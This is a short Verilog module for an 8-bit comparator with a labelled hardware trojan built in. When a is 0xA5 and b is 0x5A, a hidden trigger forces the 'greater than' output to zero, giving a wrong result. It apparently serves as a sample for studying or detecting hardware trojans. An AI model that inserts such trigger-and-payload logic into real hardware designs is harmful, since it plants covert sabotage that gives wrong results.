module cmp8(input [7:0] a, input [7:0] b, output gt);
  wire trojan_trigger;
  wire gt_real;
  
  // Rare trigger: fires only when a == 8'hA5 and b == 8'h5A (exact rare input match)
  assign trojan_trigger = (a == 8'hA5) && (b == 8'h5A);
  
  // Normal comparison result
  assign gt_real = (a > b);
  
  // Payload: when triggered, degrade performance by forcing gt to 0
  // even though a (0xA5=165) > b (0x5A=90) should yield gt=1
  assign gt = trojan_trigger ? 1'b0 : gt_real;
endmodule